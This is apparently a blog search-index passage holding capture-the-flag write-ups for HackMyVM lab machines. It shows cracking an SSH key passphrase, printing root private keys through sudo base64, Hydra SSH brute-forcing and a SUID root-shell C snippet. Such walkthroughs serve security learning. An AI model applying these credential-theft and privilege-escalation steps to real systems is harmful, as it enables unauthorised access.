DPrkThhFwrPpI6+Ex8RvcWI6bTJAWJLdmmRXUS/DtO+69/aidvxGAYob+1M= -----END OPENSSH PRIVATE KEY----- Looks like we need not only the id_rsa but also password.┌──(root💀kali)-[/opt/hackmyv/baseme]└─# chmod 600 id_rsa ┌──(root💀kali)-[/opt/hackmyv/baseme]└─# ssh lucas@192.168.56.23 lucas@192.168.56.23&#39;s password: Permission denied, please try again.lucas@192.168.56.23&#39;s password: Permission denied, please try again.lucas@192.168.56.23&#39;s password: lucas@192.168.56.23: Permission denied (publickey,password).To check which password is for the id_rsa , lets use john to crack the password.Using the previously encoded base64 dic_b64.txt .┌──(root💀kali)-[/opt/hackmyv/baseme]└─# locate ssh2john.py /usr/share/john/ssh2john.py ┌──(root💀kali)-[/opt/hackmyv/baseme]└─# python /usr/share/john/ssh2john.py id_rsa &amp;gt; id_rsa.hash ┌──(root💀kali)-[/opt/hackmyv/baseme]└─# john id_rsa.hash -wordlist=dic_b64.txt Using default input encoding: UTF-8Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashesCost 2 (iteration count) is 16 for all loaded hashesWill run 4 OpenMP threadsPress &#39;q&#39; or Ctrl-C to abort, almost any other key for statusaWxvdmV5b3UK (id_rsa) 1g 0:00:00:00 DONE (2021-12-25 04:50) 3.030g/s 18.18p/s 18.18c/s 18.18C/s aWxvdmV5b3UK..dGhleWhhdGVzbWUKUse the &quot;--show&quot; option to display all of the cracked passwords reliablySession completed. Great , the password is aWxvdmV5b3UK .┌──(root💀kali)-[/opt/hackmyv/baseme]└─# ssh lucas@192.168.56.23 -i id_rsa Enter passphrase for key &#39;id_rsa&#39;: Linux baseme 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64The programs included with the Debian GNU/Linux system are free software;the exact distribution terms for each program are described in theindividual files in /usr/share/doc/*/copyright.Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extentpermitted by applicable law.Last login: Mon Sep 28 12:51:36 2020 from 192.168.1.58lucas@baseme:~$ whoami;id;hostnamelucasuid=1000(lucas) gid=1000(lucas) groups=1000(lucas),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)basemeNice!Shell as RootStandard enumeration shows (ALL) NOPASSWD: /usr/bin/base64 we can run base64 as root. This means we can read important files such as /etc/passwd or /etc/shadow and crack password using john.lucas@baseme:~$ sudo -lMatching Defaults entries for lucas on baseme: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/binUser lucas may run the following commands on baseme: (ALL) NOPASSWD: /usr/bin/base64But obviously, the better way is to get it’s id_rsa at /root/.ssh/id_rsa and then SSH into the server as root!!lucas@baseme:~$ sudo base64 &quot;/root/.ssh/id_rsa&quot; | base64 -d-----BEGIN OPENSSH PRIVATE KEY-----b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcnNhAAAAAwEAAQAAAQEAw6MgMnxUy+W9oem0Uhr2cJiez37qVubRK9D4kdu7H5NQ/Z0FFp2BIdV3wx9xDWAICJgtYQUvOV7KFNAWvEXTDdhBwdiUcWEJ4AOXK7+5v7x4b8vuG5zK0lTVxpDEBE8faPj3UaHsa1JUVaDngTIkCa6VBICvG0DCcfL8xHBpCSIfoHfpqmOpWT/pWXvGI3tk/Ku/STY7Ay8HtSgoqCcf3F+lb9J9kwKhFg9eLO5QDuFujb1CN7gUy8xhgNanUViyCZRwn7px+DfU+nscSEfG1zgfgqn2hCbBYqaP0jBgWcVL6YoMiwCS3jhmeFG4C/p51j3gI6b8yz9aS+DtdTpDwQAAA8D82/wZ/Nv8GQAAAAdzc2gtcnNhAAABAQDDoyAyfFTL5b2h6bRSGvZwmJ7PfupW5tEr0PiR27sfk1D9nQUWnYEh1XfDH3ENYAgImC1hBS85XsoU0Ba8RdMN2EHB2JRxYQngA5crv7m/vHhvy+4bnMrSVNXGkMQETx9o+PdRoexrUlRVoOeBMiQJrpUEgK8bQMJx8vzEcGkJIh+gd+mqY6lZP+lZe8Yje2T8q79JNjsDLwe1KCioJx/cX6Vv0n2TAqEWD14s7lAO4W6NvUI3uBTLzGGA1qdRWLIJlHCfunH4N9T6exxIR8bXOB+CqfaEJsFipo/SMGBZxUvpigyLAJLeOGZ4UbgL+nnWPeAjpvzLP1pL4O11OkPBAAAAAwEAAQAAAQBIArRoQOGJh9AMWBS6oBgUC+lw4Ptq710Q7sOAFMxE7BnEsFZeI62TgZqqpNkdHjr2xuT1ME5YpK5niMzFkkIEd5SEwK6rKRfUcB3lyZWaoMoIBJ1pZoY1c2qYw1KTb3hVUEbgsmRugIhwWGC+anFfavaJCMDrnCO2g8VMnT/cTyAv/Qmi8m868KNEzcuzGV5ozHl1XLffHM9R/cqPPyAYaQIa9Z+kS6ou9RiMTjTSxOPnfh286kgx0ry1se9BBlrEc5251R/PRkEKYrMj3AIwI30qvYlAtNfcCFhoJXLqvWystPARwiUs7WYBUHRf6bPP/pHTTvwwb2bs51ngImpdAAAAgDaWnQ7Lj7Vp+mTjhSu4oGptDHNd2uuqB1+CHRcaVutUmknxvxG3p957UbvNp6e0+ePKtAIakrzbpAo6u25poyWugAuzX2nQhqsQh6yrThDJlTiDMeV7JNGFbGOcanXXXHt3tjfyrS0+aM87WmwqNyh6nfgy1C5axRfKZG8ivz5iAAAAgQD83QmCIcbZaCOlGwgHGcuCUDcxGY1QlIRnbM5VAjimNezGFs9f0ExDSiTwFsmITP//njsbRZP2laiKKO6j4yp5LpfgDB5QHs+g4nXvDn6ns64gCKo7tf2bPP8VCeFWyc2JyqREwE3WmyhkPlyr9xAZerZ+7Fz+NFueRYzDklWg8wAAAIEAxhBeLqbo6/GUKXF5rFRatLXI43Jrd9pyvLx62KghsnEBEk7my9sbU5dvYBLztS+lfPCRxV2ZzpjYdN4SDJbXIRtxBaLJe3c4uIc9WjyxGwUK9IL65rSrRVERHsTO525ofPWGQEa2A+pRCpz3A4Y41fy8Y9an2B2NmfTAfEkWFXsAAAALcm9vdEBiYXNlbWU=-----END OPENSSH PRIVATE KEY-----On our local machine, lets save the private key and give the right permission before we SSH into the server as root!┌──(root💀kali)-[/opt/hackmyv/baseme] └─# cat id_rsa_root -----BEGIN OPENSSH PRIVATE KEY-----b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcnNhAAAAAwEAAQAAAQEAw6MgMnxUy+W9oem0Uhr2cJiez37qVubRK9D4kdu7H5NQ/Z0FFp2BIdV3wx9xDWAICJgtYQUvOV7KFNAWvEXTDdhBwdiUcWEJ4AOXK7+5v7x4b8vuG5zK0lTVxpDEBE8faPj3UaHsa1JUVaDngTIkCa6VBICvG0DCcfL8xHBpCSIfoHfpqmOpWT/pWXvGI3tk/Ku/STY7Ay8HtSgoqCcf3F+lb9J9kwKhFg9eLO5QDuFujb1CN7gUy8xhgNanUViyCZRwn7px+DfU+nscSEfG1zgfgqn2hCbBYqaP0jBgWcVL6YoMiwCS3jhmeFG4C/p51j3gI6b8yz9aS+DtdTpDwQAAA8D82/wZ/Nv8GQAAAAdzc2gtcnNhAAABAQDDoyAyfFTL5b2h6bRSGvZwmJ7PfupW5tEr0PiR27sfk1D9nQUWnYEh1XfDH3ENYAgImC1hBS85XsoU0Ba8RdMN2EHB2JRxYQngA5crv7m/vHhvy+4bnMrSVNXGkMQETx9o+PdRoexrUlRVoOeBMiQJrpUEgK8bQMJx8vzEcGkJIh+gd+mqY6lZP+lZe8Yje2T8q79JNjsDLwe1KCioJx/cX6Vv0n2TAqEWD14s7lAO4W6NvUI3uBTLzGGA1qdRWLIJlHCfunH4N9T6exxIR8bXOB+CqfaEJsFipo/SMGBZxUvpigyLAJLeOGZ4UbgL+nnWPeAjpvzLP1pL4O11OkPBAAAAAwEAAQAAAQBIArRoQOGJh9AMWBS6oBgUC+lw4Ptq710Q7sOAFMxE7BnEsFZeI62TgZqqpNkdHjr2xuT1ME5YpK5niMzFkkIEd5SEwK6rKRfUcB3lyZWaoMoIBJ1pZoY1c2qYw1KTb3hVUEbgsmRugIhwWGC+anFfavaJCMDrnCO2g8VMnT/cTyAv/Qmi8m868KNEzcuzGV5ozHl1XLffHM9R/cqPPyAYaQIa9Z+kS6ou9RiMTjTSxOPnfh286kgx0ry1se9BBlrEc5251R/PRkEKYrMj3AIwI30qvYlAtNfcCFhoJXLqvWystPARwiUs7WYBUHRf6bPP/pHTTvwwb2bs51ngImpdAAAAgDaWnQ7Lj7Vp+mTjhSu4oGptDHNd2uuqB1+CHRcaVutUmknxvxG3p957UbvNp6e0+ePKtAIakrzbpAo6u25poyWugAuzX2nQhqsQh6yrThDJlTiDMeV7JNGFbGOcanXXXHt3tjfyrS0+aM87WmwqNyh6nfgy1C5axRfKZG8ivz5iAAAAgQD83QmCIcbZaCOlGwgHGcuCUDcxGY1QlIRnbM5VAjimNezGFs9f0ExDSiTwFsmITP//njsbRZP2laiKKO6j4yp5LpfgDB5QHs+g4nXvDn6ns64gCKo7tf2bPP8VCeFWyc2JyqREwE3WmyhkPlyr9xAZerZ+7Fz+NFueRYzDklWg8wAAAIEAxhBeLqbo6/GUKXF5rFRatLXI43Jrd9pyvLx62KghsnEBEk7my9sbU5dvYBLztS+lfPCRxV2ZzpjYdN4SDJbXIRtxBaLJe3c4uIc9WjyxGwUK9IL65rSrRVERHsTO525ofPWGQEa2A+pRCpz3A4Y41fy8Y9an2B2NmfTAfEkWFXsAAAALcm9vdEBiYXNlbWU=-----END OPENSSH PRIVATE KEY-----┌──(root💀kali)-[/opt/hackmyv/baseme]└─# chmod 600 id_rsa_root ┌──(root💀kali)-[/opt/hackmyv/baseme]└─# ssh root@192.168.56.23 -i id_rsa_rootLinux baseme 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64The programs included with the Debian GNU/Linux system are free software;the exact distribution terms for each program are described in theindividual files in /usr/share/doc/*/copyright.Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extentpermitted by applicable law.Last login: Sat Dec 25 05:09:35 2021 from 192.168.56.3root@baseme:~# root@baseme:~# whoami;id;hostnamerootuid=0(root) gid=0(root) groups=0(root)basemeRooted!" }, { "title": "suidy", "url": "/posts/suidy/", "categories": "hackmyvm, mediumm", "tags": "Writable files or script, SUID", "date": "2021-12-25 13:30:00 +0800", "snippet": "OverviewAnother fun box ! Box Difficulty Link mediumm hackmyvm Link ReconObjective : Find out all the open ports and do a nmap service scan.┌──(root💀kali)-[/opt/hackmyv/suidy] └─# rustscan -a 192.168.56.21 .----. .-. .-. .----..---. .----. .---. .--. .-. .-. | {} }| { } |{ {__ {_ _}{ {__ / ___} / {} \\ | `| | | .-. \\| {_} |.-._} } | | .-._} }\\ }/ /\\ \\| |\\ | `-&#39; `-&#39;`-----&#39;`----&#39; `-&#39; `----&#39; `---&#39; `-&#39; `-&#39;`-&#39; `-&#39; The Modern Day Port Scanner. ________________________________________ : https://discord.gg/GFrQsGy : : https://github.com/RustScan/RustScan : -------------------------------------- Real hackers hack time ⌛ [~] The config file is expected to be at &quot;/root/.rustscan.toml&quot; [!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers [!] Your file limit is very small, which negatively impacts RustScan&#39;s speed. Use the Docker image, or up the Ulimit with &#39;--ulimit 5000&#39;. Open 192.168.56.21:22 Open 192.168.56.21:80We can see that there’s 2 open port. Port 22 and 80.nmap output shows the below:┌──(root💀kali)-[/opt/hackmyv/suidy]└─# nmap -sV -sC -o nmap.txt 192.168.56.21 Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-24 22:00 ESTNmap scan report for 192.168.56.21Host is up (0.00012s latency).Not shown: 998 closed tcp ports (reset)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)| ssh-hostkey: | 2048 8a:cb:7e:8a:72:82:84:9a:11:43:61:15:c1:e6:32:0b (RSA)| 256 7a:0e:b6:dd:8f:ee:a7:70:d9:b1:b5:6e:44:8f:c0:49 (ECDSA)|_ 256 80:18:e6:c7:01:0e:c6:6d:7d:f4:d2:9f:c9:d0:6f:4c (ED25519)80/tcp open http nginx 1.14.2|_http-server-header: nginx/1.14.2|_http-title: Site doesn&#39;t have a title (text/html).MAC Address: 08:00:27:2D:0E:C9 (Oracle VirtualBox virtual NIC)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 7.09 secondsLet’s enumerate port 80!HTTP- TCP 80Gobuster shows that there’s two possible files.Gobuster:┌──(root💀kali)-[/opt/hackmyv/suidy]└─# gobuster dir -u http://192.168.56.21:80 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 100 -e -k -s &quot;200,204,301,302,307,403,500&quot; -x &quot;txt,html,php,php.bak,bak,jsp&quot; -o gobuster_p80.txt===============================================================Gobuster v3.1.0by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@firefart)===============================================================[+] Url: http://192.168.56.21:80[+] Method: GET[+] Threads: 100[+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt[+] Negative Status codes: 404[+] User Agent: gobuster/3.1.0[+] Extensions: txt,html,php,php.bak,bak,jsp[+] Expanded: true[+] Timeout: 10s===============================================================2021/12/24 22:02:06 Starting gobuster in directory enumeration mode===============================================================http://192.168.56.21:80/index.html (Status: 200) [Size: 22]http://192.168.56.21:80/robots.txt (Status: 200) [Size: 362] ===============================================================2021/12/24 22:03:52 Finished===============================================================robots.txt is always something look at!──(root💀kali)-[/opt/hackmyv/suidy] └─# curl http://192.168.56.21/robots.txt /hi /....\\..\\.-\\--.\\.-\\..\\-. ........./shehatesmeAfter curling robots.txt, we can see that all the way at the bottom there’s another interesting file /shehatesme. Let’s take a look at that file!┌──(root💀kali)-[/opt/hackmyv/suidy]└─# curl 192.168.56.21/shehatesme/ She hates me because I FOUND THE REAL SECRET!I put in this directory a lot of .txt files.ONE of .txt files contains credentials like &quot;theuser/thepass&quot; to access to her system!All that you need is an small dict from Seclist!Looks like this time we have to gobuster the specified folder to find out more.──(root💀kali)-[/opt/hackmyv/suidy] └─# gobuster dir -u http://192.168.56.21/shehatesme/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -t 100 -e -k -s &quot;200,204,301,302,307,403,500&quot; -x &quot;txt&quot; -o gobuster_p80.txt =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://192.168.56.21/shehatesme/ [+] Method: GET [+] Threads: 100 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Extensions: txt [+] Expanded: true [+] Timeout: 10s =============================================================== 2021/12/24 22:10:47 Starting gobuster in directory enumeration mode =============================================================== http://192.168.56.21/shehatesme/privacy.txt (Status: 200) [Size: 16]http://192.168.56.21/shehatesme/about.txt (Status: 200) [Size: 16]http://192.168.56.21/shehatesme/new.txt (Status: 200) [Size: 16]http://192.168.56.21/shehatesme/forums.txt (Status: 200) [Size: 16]http://192.168.56.21/shehatesme/search.txt (Status: 200) [Size: 16]http://192.168.56.21/shehatesme/page.txt (Status: 200) [Size: 16]http://192.168.56.21/shehatesme/blog.txt (Status: 200) [Size: 16]http://192.168.56.21/shehatesme/jobs.txt (Status: 200) [Size: 16]http://192.168.56.21/shehatesme/full.txt (Status: 200) [Size: 16]http://192.168.56.21/shehatesme/space.txt (Status: 200) [Size: 16]http://192.168.56.21/shehatesme/link.txt (Status: 200) [Size: 16]http://192.168.56.21/shehatesme/2001.txt (Status: 200) [Size: 16]http://192.168.56.21/shehatesme/other.txt (Status: 200) [Size: 16]http://192.168.56.21/shehatesme/admin.txt (Status: 200) [Size: 16]http://192.168.56.21/shehatesme/faqs.txt (Status: 200) [Size: 16]http://192.168.56.21/shehatesme/welcome.txt (Status: 200) [Size: 16]http://192.168.56.21/shehatesme/google.txt (Status: 200) [Size: 16]http://192.168.56.21/shehatesme/network.txt (Status: 200) [Size: 16]http://192.168.56.21/shehatesme/es.txt (Status: 200) [Size: 16]http://192.168.56.21/shehatesme/java.txt (Status: 200) [Size: 16]http://192.168.56.21/shehatesme/issues.txt (Status: 200) [Size: 16]http://192.168.56.21/shehatesme/guide.txt (Status: 200) [Size: 16]http://192.168.56.21/shehatesme/art.txt (Status: 200) [Size: 16]http://192.168.56.21/shehatesme/folder.txt (Status: 200) [Size: 16]http://192.168.56.21/shehatesme/smilies.txt (Status: 200) [Size: 16]http://192.168.56.21/shehatesme/airport.txt (Status: 200) [Size: 16]http://192.168.56.21/shehatesme/secret.txt (Status: 200) [Size: 16]http://192.168.56.21/shehatesme/procps.txt (Status: 200) [Size: 16]http://192.168.56.21/shehatesme/pynfo.txt (Status: 200) [Size: 16]http://192.168.56.21/shehatesme/lh2.txt (Status: 200) [Size: 16]http://192.168.56.21/shehatesme/wha.txt (Status: 200) [Size: 16]http://192.168.56.21/shehatesme/alba.txt (Status: 200) [Size: 16]http://192.168.56.21/shehatesme/cymru.txt (Status: 200) [Size: 16]http://192.168.56.21/shehatesme/muze.txt (Status: 200) [Size: 16] ===============================================================2021/12/24 22:10:58 Finished===============================================================There’s really alot of links to look through, let’s save these link in url_links.txt and automate the process of checking the username and password from each link.Save the output┌──(root💀kali)-[/opt/hackmyv/suidy]└─# cat url_links.txt http://192.168.56.21/shehatesme/privacy.txthttp://192.168.56.21/shehatesme/about.txthttp://192.168.56.21/shehatesme/new.txthttp://192.168.56.21/shehatesme/forums.txthttp://192.168.56.21/shehatesme/search.txthttp://192.168.56.21/shehatesme/page.txthttp://192.168.56.21/shehatesme/blog.txthttp://192.168.56.21/shehatesme/jobs.txthttp://192.168.56.21/shehatesme/full.txthttp://192.168.56.21/shehatesme/space.txthttp://192.168.56.21/shehatesme/link.txthttp://192.168.56.21/shehatesme/2001.txthttp://192.168.56.21/shehatesme/other.txthttp://192.168.56.21/shehatesme/admin.txthttp://192.168.56.21/shehatesme/faqs.txthttp://192.168.56.21/shehatesme/welcome.txthttp://192.168.56.21/shehatesme/google.txthttp://192.168.56.21/shehatesme/network.txthttp://192.168.56.21/shehatesme/es.txthttp://192.168.56.21/shehatesme/java.txthttp://192.168.56.21/shehatesme/issues.txthttp://192.168.56.21/shehatesme/guide.txthttp://192.168.56.21/shehatesme/art.txthttp://192.168.56.21/shehatesme/folder.txthttp://192.168.56.21/shehatesme/smilies.txthttp://192.168.56.21/shehatesme/airport.txthttp://192.168.56.21/shehatesme/secret.txthttp://192.168.56.21/shehatesme/procps.txthttp://192.168.56.21/shehatesme/pynfo.txthttp://192.168.56.21/shehatesme/lh2.txthttp://192.168.56.21/shehatesme/wha.txthttp://192.168.56.21/shehatesme/alba.txthttp://192.168.56.21/shehatesme/cymru.txthttp://192.168.56.21/shehatesme/muze.txtSince each file contain user/pass, we download and store it to user_pass.txt┌──(root💀kali)-[/opt/hackmyv/suidy]└─# curl http://192.168.56.21/shehatesme/privacy.txt jaime11/JKiufg6we can automate the process by cat url_links.txt | while read f; do curl &quot;${f}&quot; &amp;gt;&amp;gt; user_pass.txt; done; This will look up all the links and store the user/password in user_pass.txt.──(root💀kali)-[/opt/hackmyv/suidy] └─# cat url_links.txt | while read f; do curl &quot;${f}&quot; &amp;gt;&amp;gt; user_pass.txt; done; % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 16 100 16 0 0 11355 0 --:--:-- --:--:-- --:--:-- 16000 ..........┌──(root💀kali)-[/opt/hackmyv/suidy]└─# cat user_pass.txt jaime11/JKiufg6jaime11/JKiufg6jaime11/JKiufg6hidden1/passZZ!john765/FDrhguyjaime11/JKiufg6jhfbvgt/iugbnvh....Since there are many repetitive username and password .Next let’s sort the contnent and only store unique username and repeat the same process for the password as well.┌──(root💀kali)-[/opt/hackmyv/suidy]└─# cut -d &#39;/&#39; -f1 user_pass.txt | while read line; do echo &quot;$line&quot; &amp;gt;&amp;gt; user.txt ; done Explanation of the above code-d ‘/’ use backslash as delimiter (d)-f1 the first (1) field (f)while read line reading from the file, loop over each line as variable $lineAnd with that we are able to extract the username from each line.──(root💀kali)-[/opt/hackmyv/suidy]└─# sort user.txt | uniq &amp;gt;&amp;gt; sorted_user.txt┌──(root💀kali)-[/opt/hackmyv/suidy]└─# cat sorted_user.txt hidden1jaime11jhfbvgtjohn765maria11mmnnbbvnhvjguysmileystheuseryuijhse──(root💀kali)-[/opt/hackmyv/suidy] └─# cut -d &#39;/&#39; -f2 user_pass.txt | while read line; do echo &quot;$line&quot; &amp;gt;&amp;gt; pass.txt ; done┌──(root💀kali)-[/opt/hackmyv/suidy]└─# cut -d &#39;/&#39; -f2 user_pass.txt | while read line; do echo &quot;$line&quot; &amp;gt;&amp;gt; pass.txt ; done ┌──(root💀kali)-[/opt/hackmyv/suidy]└─# sort pass.txt | uniq &amp;gt;&amp;gt; sorted_pass.txt ┌──(root💀kali)-[/opt/hackmyv/suidy]└─# cat sorted_pass.txt 98GHbjhFDrhguyhjupnkkiugbnvhiughtyrjhfgyRfJKiufg6kjhgyutpassZZ!thepassShell as theuserLet’s use hydra as always to bruteforce SSH with the username and password we found.┌──(root💀kali)-[/opt/hackmyv/suidy]└─# hydra -s 22 -L sorted_user.txt -P sorted_pass.txt 192.168.56.21 -t 4 ssh -vHydra v9.2 (c) 2021 by van Hauser/THC &amp;amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-12-24 22:39:11[DATA] max 4 tasks per 1 server, overall 4 tasks, 100 login tries (l:10/p:10), ~25 tries per task[DATA] attacking ssh://192.168.56.21:22/[VERBOSE] Resolving addresses ... [VERBOSE] resolving done[INFO] Testing if password authentication is supported by ssh://hidden1@192.168.56.21:22[INFO] Successful, password authentication is supported by ssh://192.168.56.21:22[STATUS] 76.00 tries/min, 76 tries in 00:01h, 24 to do in 00:01h, 4 active[22][ssh] host: 192.168.56.21 login: theuser password: thepass[STATUS] attack finished for 192.168.56.21 (waiting for children to complete tests)1 of 1 target successfully completed, 1 valid password foundHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-12-24 22:40:30Looks like the username and password is theuser:thepass …┌──(root💀kali)-[/opt/hackmyv/suidy]└─# ssh theuser@192.168.56.21theuser@192.168.56.21&#39;s password: Linux suidy 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64The programs included with the Debian GNU/Linux system are free software;the exact distribution terms for each program are described in theindividual files in /usr/share/doc/*/copyright.Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extentpermitted by applicable law.Last login: Sat Dec 25 04:41:06 2021 from 192.168.56.3theuser@suidy:~$ whoami;hostname;idtheusersuidyuid=1000(theuser) gid=1000(theuser) grupos=1000(theuser),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)Shell as RootFurther enumeration shows that in /home/suidy, there is a suidyyyyy file that has a SUID/SGID bit which we can execute.theuser@suidy:/home/suidy$ ls -laR.:total 52drwxr-xr-x 3 suidy suidy 4096 sep 27 2020 .drwxr-xr-x 4 root root 4096 sep 26 2020 ..-rw------- 1 suidy suidy 12 sep 27 2020 .bash_history-rw-r--r-- 1 suidy suidy 220 sep 26 2020 .bash_logout-rw-r--r-- 1 suidy suidy 3526 sep 26 2020 .bashrcdrwxr-xr-x 3 suidy suidy 4096 sep 26 2020 .local-r--r----- 1 suidy suidy 197 sep 26 2020 note.txt-rw-r--r-- 1 suidy suidy 807 sep 26 2020 .profile-rwsrwsr-x 1 root theuser 16704 sep 26 2020 suidyyyyy -rwsrwsr-x 1 root theuser 16704 sep 26 2020 suidyyyyyRunning the file make us run a suidysuidy@suidy:/home/suidy$ cat note.txtI love SUID files!The best file is suidyyyyy because users can use it to feel as I feel.root know it and run an script to be sure that my file has SUID. If you are &quot;theuser&quot; I hate you!Readig note.txt shows that :“The best file is suidyyyyy because users can use it to feel as I feel.” - Feel as I feel means become suidy user itself!“root know it and run an script to be sure that my file has SUID. “-Means that there is probably a process in the backend that automatically give the file a SUID bit.Knowing this , On the victim machine, let’s make a executable file so that we can become root!theuser@suidy:~$ pwd/home/theusertheuser@suidy:~$ cat suidyyyyy.c int main(void){setresuid(0, 0, 0);system(&quot;/bin/sh -p&quot;);}As you can see that after while the file is given the suid bit.Once it has been given a suid bit we can execute the file to run as root!theuser@suidy:~$ ls -la /home/suidy/suidyyyyy -rwxrwxr-x 1 root theuser 16664 dic 25 05:21 /home/suidy/suidyyyyytheuser@suidy:~$ ls -la /home/suidy/suidyyyyy -rwxrwxr-x 1 root theuser 16664 dic 25 05:21 /home/suidy/suidyyyyy$ whoamitheuser$ exittheuser@suidy:~$ ls -la /home/suidy/suidyyyyy -rwxrwxr-x 1 root theuser 16664 dic 25 05:21 /home/suidy/suidyyyyytheuser@suidy:~$ ls -la /home/suidy/suidyyyyy -rwsrwsr-x 1 root theuser 16664 dic 25 05:21 /home/suidy/suidyyyyytheuser@suidy:~$ /home/suidy/suidyyyyy # whoami;idrootuid=0(root) gid=1000(theuser) grupos=1000(theuser),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)Awesome ,Rooted!" }, { "title": "hackmyvm: pwned", "url": "/posts/pwned/", "categories": "hackmyvm, easyy", "tags": "Docker Escape", "date": "2021-12-23 20:00:00 +0800", "snippet": "Overview Box Difficulty Link Easy hackmyvm Link Found this new site for vulnerable machines.For this box I downloaded it off hackmyvm and gave it a spin.It’s been long, but i’m treating this a as a practice session to warm my hands up.ReconObjective : Find out all the open ports and do a nmap service scan.I recently found out about rustscan and decided to give it a try.┌──(root💀kali)-[/opt/hackmyv/pwned] └─# rustscan -a 192.168.56.19 .----. .-. .-. .----..---. .----. .---. .--. .-. .-. | {} }| { } |{ {__ {_ _}{ {__ / ___} / {} \\ | `| | | .-. \\| {_} |.-._} } | | .-._} }\\ }/ /\\ \\| |\\ | `-&#39; `-&#39;`-----&#39;`----&#39; `-&#39; `----&#39; `---&#39; `-&#39; `-&#39;`-&#39; `-&#39; The Modern Day Port Scanner. ________________________________________: https://discord.gg/GFrQsGy :: https://github.com/RustScan/RustScan : --------------------------------------Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan[~] The config file is expected to be at &quot;/root/.rustscan.toml&quot;[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers[!] Your file limit is very small, which negatively impacts RustScan&#39;s speed. Use the Docker image, or up the Ulimit with &#39;--ulimit 5000&#39;. Open 192.168.56.19:21Open 192.168.56.19:22Open 192.168.56.19:80We can see that there’s 3 open port. Port 21,22 and 80.nmap output shows the below:┌──(root💀kali)-[/opt/hackmyv/pwned]└─# nmap -sV -sC -p 21,22,80 192.168.56.19 -o nmap.txt Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-22 05:18 ESTNmap scan report for 192.168.56.19Host is up (0.00059s latency).PORT STATE SERVICE VERSION21/tcp open ftp vsftpd 3.0.322/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)| ssh-hostkey: | 2048 fe:cd:90:19:74:91:ae:f5:64:a8:a5:e8:6f:6e:ef:7e (RSA)| 256 81:32:93:bd:ed:9b:e7:98:af:25:06:79:5f:de:91:5d (ECDSA)|_ 256 dd:72:74:5d:4d:2d:a3:62:3e:81:af:09:51:e0:14:4a (ED25519)80/tcp open http Apache httpd 2.4.38 ((Debian))|_http-title: Pwned....!!|_http-server-header: Apache/2.4.38 (Debian)MAC Address: 08:00:27:A1:7E:A2 (Oracle VirtualBox virtual NIC)Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 7.78 secondsLet’s enumerate!FTP- TCP 21vsFTPd version 3.0.3 based off banner grabbing, however nothing to work on here.┌──(root💀kali)-[/opt/hackmyv/pwned]└─# ftp 192.168.56.19Connected to 192.168.56.19.220 (vsFTPd 3.0.3)Name (192.168.56.19:kali): 530 Permission denied.ftp: Login failedftp&amp;gt; exit221 Goodbye. ┌──(root💀kali)-[/opt/hackmyv/pwned]└─# searchsploit vsftpd ---------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path---------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------vsftpd 2.0.5 - &#39;CWD&#39; (Authenticated) Remote Memory Consumption | linux/dos/5814.plvsftpd 2.0.5 - &#39;deny_file&#39; Option Remote Denial of Service (1) | windows/dos/31818.shvsftpd 2.0.5 - &#39;deny_file&#39; Option Remote Denial of Service (2) | windows/dos/31819.plvsftpd 2.3.2 - Denial of Service | linux/dos/16270.cvsftpd 2.3.4 - Backdoor Command Execution | unix/remote/49757.pyvsftpd 2.3.4 - Backdoor Command Execution (Metasploit) | unix/remote/17491.rbvsftpd 3.0.3 - Remote Denial of Service | multiple/remote/49719.py---------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------Shellcodes: No Results HTTP- TCP 80Looing through nikto output we can see that there’s a robot.txt file which contain/nothing┌──(root💀kali)-[/opt/hackmyv/pwned]└─# nikto -ask=no -h 192.168.56.19:80 